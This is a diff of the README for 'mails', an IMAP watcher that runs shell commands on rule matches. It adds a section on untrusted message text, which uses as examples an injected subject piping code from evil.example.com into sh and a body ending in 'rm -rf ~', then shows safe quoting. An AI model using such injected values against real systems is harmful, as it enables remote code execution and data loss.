@@ -92,7 +92,7 @@ already develop with MoonBit.
 curl -LsSf https://raw.githubusercontent.com/tomasky/mails/master/install.sh | bash
 ```
 
-No Node.js or MoonBit required. The script accepts `--version 0.1.6`,
+No Node.js or MoonBit required. The script accepts `--version 0.1.7`,
 `--install-dir DIR` and `--no-verify`, and verifies the published SHA-256
 before installing. By default it installs into `~/.local/bin`.
 
@@ -137,7 +137,7 @@ See [Building](#building) for the static Linux build and tests.
 
 ## Releases
 
-Releases are tagged `v<version>` (for example `v0.1.6`). Each release publishes
+Releases are tagged `v<version>` (for example `v0.1.7`). Each release publishes
 one binary per target plus its `.sha256` checksum; there are no archives,
 because the installer, the npm launcher and `curl` all want the bare binary.
 Source archives are provided by GitHub for every tag.
@@ -449,19 +449,38 @@ Inside `command` and every `exec` argument:
 | `{{rule}}`, `{{keywords}}`, `{{fields}}` | Which rule fired and why |
 | `{{*_q}}` | The same value single-quoted for a POSIX shell |
 
-`{{subject}}` is inserted raw, so a subject containing `$(...)` is dangerous in
-a shell command. Use `{{subject_q}}`, or read `$MAILS_SUBJECT`, which is passed
-through the environment and never parsed by a shell:
+### Message text is untrusted input
+
+`{{subject}}`, `{{from}}`, `{{to}}`, `{{date}}`, `{{message_id}}` and
+`{{body}}` are inserted **raw**, and `command` runs under `sh -c`. Anyone who
+can send you mail can therefore run a command through your rule: a subject of
+``$(curl -s evil.example.com/x|sh)``, or a body ending in `; rm -rf ~`, is
+enough. `mails check` and `mails watch` warn about every rule that does this.
+
+`cat {{body}}` is the classic mistake: the body is not one word, so `cat` treats
+it as a file name. Two safe ways to read the text:
 
 ```toml
-command = 'logger -t mails "$MAILS_SUBJECT"'
+# Shell-quoted placeholder: safe whatever the sender wrote.
+command = 'printf "%s\n" {{body_q}} >> ~/mail.log'
+
+# Or the environment, which a shell never parses.
+command = 'printf "%s\n" "$MAILS_BODY" >> ~/mail.log'
 ```
+
+`{{*_q}}` single-quotes the value, so `$(...)`, quotes and `;` are all inert.
 
 The full environment for a rule command:
 
 `MAILS_ACCOUNT`, `MAILS_MAILBOX`, `MAILS_UID`, `MAILS_SUBJECT`, `MAILS_FROM`,
 `MAILS_TO`, `MAILS_DATE`, `MAILS_MESSAGE_ID`, `MAILS_RULE`,
-`MAILS_KEYWORDS`, `MAILS_BODY` (truncated), `MAILS_BODY_FULL`.
+`MAILS_KEYWORDS`, `MAILS_BODY` (truncated to `body_chars`), `MAILS_BODY_FULL`,
+and `MAILS_BODY_TRUNCATED` (`1`) when `MAILS_BODY_FULL` was cut.
+
+A single environment value cannot exceed 128 KiB on Linux (`execve` fails with
+`E2BIG`), so `MAILS_BODY_FULL` stops at 60 000 bytes and sets
+`MAILS_BODY_TRUNCATED=1`. Use `{{body}}` with a larger `body_chars`, or write the
+raw message to a file, when you need every byte.
 
 The body keeps the line breaks of the original message, so a posted notification
 reads like the mail. Two things to keep in mind when you post it: JSON strings
@@ -537,6 +556,7 @@ Options:
 | --- | --- | --- |
 | `MAILS_CONFIG` | `mails` | Config path when `--config` is not passed |
 | `MAILS_KEY` | `mails` | Encryption key fallback when `.env` does not define `general.key_env` |
+| `MAILS_QUIET` | `mails` | `1` silences everything but errors (same as `-q`, also dropping warnings) |
 | `MAILS_BINARY`, `MAILS_CACHE_DIR`, … | npm launcher | Control the downloaded binary; see [`npmjs/README.md`](npmjs/README.md) |
 
 Rule commands receive their own variables: `MAILS_ACCOUNT`, `MAILS_MAILBOX`,
@@ -566,7 +586,10 @@ For every configured mailbox, `mails` opens its own connection, logs in,
 3. `UID SEARCH UID <last+1>:*`, then `UID FETCH` each new UID for its header and
    a bounded slice of its text body.
 4. Parse MIME, run every matching rule's command, and advance `last_uid`, which
-   is also written to `.<account>.<mailbox>.cursor` next to `mails.toml`.
+   is also written to `.<account>.<mailbox>.<digest>.cursor` next to
+   `mails.toml`, after every message. The digest keeps mailboxes whose names
+   differ only in characters that are unsafe in a file name (`Sent Items` versus
+   `Sent/Items`) from sharing one cursor.
 
 If the server rejects `IDLE`, the loop falls back to polling every 60 seconds.
 The saved cursor is what a reconnect resumes from, so a dropped connection does
@@ -699,11 +722,19 @@ directly instead of resolving them at runtime.
 - **Text charsets.** UTF-8 plus everything the WHATWG Encoding Standard knows
   about: GBK/GB2312/GB18030, Big5, Shift_JIS, EUC-JP/KR, ISO-2022-JP and the
   ISO-8859/windows-125x single-byte families, so Chinese mail from QQ, 163 and
-  Exmail matches and renders correctly. Unknown charsets still fall back to a
-  lossy UTF-8 read.
+  Exmail matches and renders correctly. A `text/html` part with no `charset`
+  parameter inherits the one its `<meta>` tag declares. Unknown charsets still
+  fall back to a lossy UTF-8 read.
 - **One connection per mailbox**, and rule commands for a mailbox run
   sequentially. A slow command delays processing of later messages on that
   mailbox; use `timeout` to bound it.
+- **Message text is untrusted.** `{{subject}}`, `{{from}}` and `{{body}}` are
+  substituted raw into `sh -c`, so use `{{..._q}}` or the `MAILS_*` environment;
+  both `mails check` and `mails watch` warn about rules that do not.
+- **A single environment value stops at 128 KiB.** `MAILS_BODY_FULL` is capped
+  at 60 000 bytes (and sets `MAILS_BODY_TRUNCATED=1`), because Linux refuses a
+  larger `execve` environment. Write the message to a file when you need every
+  byte.
 - **Plain passwords are still accepted** for compatibility with password
   helpers, but they are not encrypted at rest. Prefer `mails encrypt`.
 - **No desktop notification backend.** Call `notify-send`,
